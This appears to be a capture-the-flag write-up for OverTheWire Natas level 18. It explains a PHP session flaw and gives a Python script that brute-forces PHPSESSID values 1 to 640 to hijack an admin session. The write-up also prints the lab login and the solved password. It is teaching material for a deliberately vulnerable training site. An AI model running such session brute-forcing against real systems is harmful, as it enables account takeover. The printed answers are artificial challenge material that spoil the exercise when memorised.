🔐 **Level 18**

When accessing the challenge website, we are greeted with a **login form** quite similar to the previous ones:  
<img width="1844" height="467" alt="image" src="https://github.com/user-attachments/assets/88871cff-d460-48ba-a679-a1daa470ca30" />

Clicking on **View Source Code** shows the HTML of the page:  
<img width="1223" height="863" alt="image" src="https://github.com/user-attachments/assets/9ecb45c7-d71d-4b46-8fdd-da1546d7b364" />

This time, the web application does **not use MySQL** but instead validates using PHP sessions. Looking deeper into the PHP code, we find the following function:

```
php
function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
        if(!session_start()) {
            debug("Session start failed");
            return false;
        } else {
            debug("Session start ok");
            if(!array_key_exists("admin", $_SESSION)) {
                debug("Session was old: admin flag set");
                $_SESSION["admin"] = 0; // backwards compatible, secure
            }
            return true;
        }
    }
    return false;
}
```
🔎 This code reveals that the challenge is related to Cookies 🍪, specifically the PHPSESSID. If we can guess the correct session ID, we may become admin=1.

Checking the cookies of the website:
<img width="1919" height="538" alt="image" src="https://github.com/user-attachments/assets/f03b22ab-32c3-48df-80b1-33bef03867a6" />

Here, PHPSESSID is the key factor, and the session ID range seems to be from 1 to 640.

👉 To brute-force this, I wrote a Python script to try all possible PHPSESSID values:
```
import requests

url = "http://natas18.natas.labs.overthewire.org"
auth = ('natas18', '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ')

for i in range(1, 641):
    cookies = {"PHPSESSID": str(i)}
    r = requests.get(url=url, auth=auth, cookies=cookies)
    if "You are an admin." in r.text:
        print(f"[+] Found admin PHPSESSID: {i}")
        print(r.text)
        break
    else:
        print("[-] Not correct yet")
```
💡 The script tests each session ID until it finds one with admin privileges.

And finally, the password was revealed:
<img width="1374" height="285" alt="image" src="https://github.com/user-attachments/assets/fe4a6237-7011-41d7-91cc-4fcb643466f3" />

✨ Password:
```
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```
